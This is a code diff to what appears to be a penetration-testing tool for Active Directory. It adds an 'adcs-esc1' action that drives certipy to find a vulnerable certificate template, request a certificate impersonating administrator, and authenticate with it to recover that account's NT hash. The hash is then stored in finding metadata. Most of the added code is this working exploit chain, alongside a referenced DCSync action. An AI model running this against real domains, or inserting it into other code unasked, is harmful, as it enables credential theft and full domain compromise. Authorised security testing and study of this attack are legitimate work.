@@ -16,6 +16,8 @@ import json
 import os
 import re
 import secrets
+import shutil
+import subprocess
 import tempfile
 import time
 from dataclasses import dataclass
@@ -487,3 +489,152 @@ ACTIONS["dcsync-user"] = Action(
     "dcsync-user", "DCSync this account", ("user",),
     offensive=True, handler=_dcsync_user, warn=_dcsync_warn)
 # Deferred: a domain-wide `dcsync` (all accounts via -just-dc / full --ntds) - out of scope now.
+
+
+# --------------------------------------------------------------------------- #
+# AD CS ESC1 exploit: certipy req (issue a cert) -> certipy auth (recover hash) #
+# --------------------------------------------------------------------------- #
+# certipy auth prints the recovered hash as `Got hash for 'user@dom': <LM>:<NT>`.
+_CERTIPY_HASH = re.compile(
+    r"(?i)Got hash for '(?P<acct>[^']+)':\s*[0-9a-f]{32}:(?P<nt>[0-9a-f]{32})")
+
+
+def parse_certipy_auth(raw: str) -> list[tuple[str, str]]:
+    """Recovered (account, nthash) pairs from `certipy auth` stdout, deduped in first-seen order."""
+    out: list[tuple[str, str]] = []
+    seen: set[str] = set()
+    for m in _CERTIPY_HASH.finditer(raw):
+        acct, nt = m.group("acct"), m.group("nt").lower()
+        if acct in seen:
+            continue
+        seen.add(acct)
+        out.append((acct, nt))
+    return out
+
+
+def ca_for_template(find_data: "dict | str", template: str) -> "tuple[str, str] | None":
+    """Resolve (ca_name, ca_host) that publishes `template`, from a certipy `find -json` blob.
+
+    Pure, tolerant lookup reusing certipy's object iteration. Returns None if the template or its
+    CA can't be resolved. VERIFY on Kali: the certipy JSON shape is version-dependent - the test
+    fixture is the source of truth. Falls back to the CA name as the host if no DNS name is found.
+    """
+    from .engines.certipy import _iter_objects, _name_of
+    if isinstance(find_data, str):
+        find_data = json.loads(find_data)
+    templates: dict[str, dict] = {}
+    cas: dict[str, dict] = {}
+    for kind, obj in _iter_objects(find_data):
+        (templates if kind == "template" else cas)[_name_of(obj).lower()] = obj
+    tobj = templates.get(template.lower())
+    if not tobj:
+        return None
+    ca_list = tobj.get("Certificate Authorities") or tobj.get("CAs") or []
+    if isinstance(ca_list, str):
+        ca_list = [ca_list]
+    if not ca_list:
+        return None
+    ca_name = str(ca_list[0])
+    caobj = cas.get(ca_name.lower())
+    ca_host = None
+    if caobj:
+        ca_host = caobj.get("DNS Name") or caobj.get("dNSHostName") or caobj.get("DNS Host Name")
+    return (ca_name, str(ca_host) if ca_host else ca_name)
+
+
+def _default_adcs_esc1_run(target: str, tgt: Target) -> str:
+    """Exploit ESC1 live: `certipy find` (resolve the CA publishing `target`) -> `req` (issue a
+    cert impersonating administrator) -> `auth` (recover the NT hash). Returns the auth stdout.
+
+    VERIFY on Kali: certipy req/auth argv + the find JSON shape; patched CAs (post-May-2022
+    strong-mapping) may additionally need `-sid`. Runs LIVE at execution time.
+    """
+    exe = shutil.which("certipy") or shutil.which("certipy-ad")
+    if not exe:
+        return ""
+    dom = tgt.domain or ""
+    upn = f"administrator@{dom}" if dom else "administrator"
+
+    def _cred_args() -> list[str]:
+        a: list[str] = []
+        if tgt.username:
+            a += ["-u", f"{tgt.username}@{dom}" if dom else tgt.username]
+        if tgt.nthash:
+            a += ["-hashes", f":{tgt.nthash}"]
+        elif tgt.password is not None:
+            a += ["-p", tgt.password]
+        return a
+
+    def _run(args: list[str]) -> str:
+        try:
+            p = subprocess.run([exe] + args, capture_output=True, text=True, timeout=300)
+        except (subprocess.TimeoutExpired, OSError):
+            return ""
+        return (p.stdout or "") + "\n" + (p.stderr or "")
+
+    with tempfile.TemporaryDirectory() as td:
+        # 1. find -> resolve the CA that publishes the clicked template
+        _run(["find", "-dc-ip", tgt.host, "-vulnerable", "-json",
+              "-output", os.path.join(td, "find")] + _cred_args())
+        matches = glob.glob(os.path.join(td, "*.json"))
+        if not matches:
+            return ""
+        with open(matches[0], encoding="utf-8") as fh:
+            resolved = ca_for_template(json.load(fh), target)
+        if not resolved:
+            return ""
+        ca_name, ca_host = resolved
+        # 2. req -> issue a cert impersonating administrator
+        _run(["req", "-dc-ip", tgt.host, "-target", ca_host, "-ca", ca_name,
+              "-template", target, "-upn", upn, "-out", os.path.join(td, "cert")] + _cred_args())
+        pfxs = glob.glob(os.path.join(td, "*.pfx"))
+        if not pfxs:
+            return ""
+        # 3. auth -> recover the NT hash from the issued cert
+        return _run(["auth", "-pfx", pfxs[0], "-dc-ip", tgt.host])
+
+
+def _adcs_esc1_warn(target: str) -> str:
+    return (f"Requests a certificate via AD CS ESC1 on template '{target}' impersonating a "
+            f"privileged user (administrator), then authenticates to recover their NT hash - a "
+            f"direct domain-compromise path. Touches the CA; leaves an issued certificate and "
+            f"authentication artifacts.")
+
+
+def _adcs_esc1(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
+               runner: Optional[Callable[[str, Target], str]] = None) -> list[Finding]:
+    """Exploit ESC1 on the clicked template: issue a cert impersonating a privileged user and
+    recover their NT hash. Reuses parse_certipy_auth; the hash rides in meta["credentials"].
+    """
+    creds = parse_certipy_auth((runner or _default_adcs_esc1_run)(target, tgt))
+    if not creds:
+        return []
+    account, nt = creds[0]
+    return [Finding(
+        id="adcs-esc1-abused",
+        title=f"AD CS ESC1 abused via {target} -> {account}",
+        severity=Severity.CRITICAL,
+        category=Category.ADCS,
+        description=f"Requested a certificate via ESC1 on template '{target}' impersonating "
+                    f"'{account}', then authenticated with it to recover their NT hash.",
+        impact="Certificate-based impersonation of a privileged principal yields their NT hash "
+               "and a Kerberos TGT - a direct path to domain compromise.",
+        remediation="Remove ENROLLEE_SUPPLIES_SUBJECT (msPKI-Certificate-Name-Flag) from the "
+                    "template, restrict enrollment permissions, and enable manager approval.",
+        affected=[account],
+        evidence=[Evidence(source="certipy",
+                           detail=f"ESC1 on {target}; recovered NT hash for {account}")],
+        references=["https://github.com/ly4k/Certipy",
+                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2"],
+        credentialed=True,
+        # NB: deliberately NO meta["esc"] - this is a completed credential recovery, not a
+        # vuln-template lead, so paths.adcs_da_targets() semantics stay untouched.
+        meta={"offensive": True, "action": "adcs-esc1",
+              "credentials": [{"account": account, "kind": "nthash", "secret": nt,
+                               "source": "adcs-esc1"}]},
+    )]
+
+
+ACTIONS["adcs-esc1"] = Action(
+    "adcs-esc1", "Exploit AD CS ESC1 (issue cert)", ("template",),
+    offensive=True, handler=_adcs_esc1, warn=_adcs_esc1_warn)
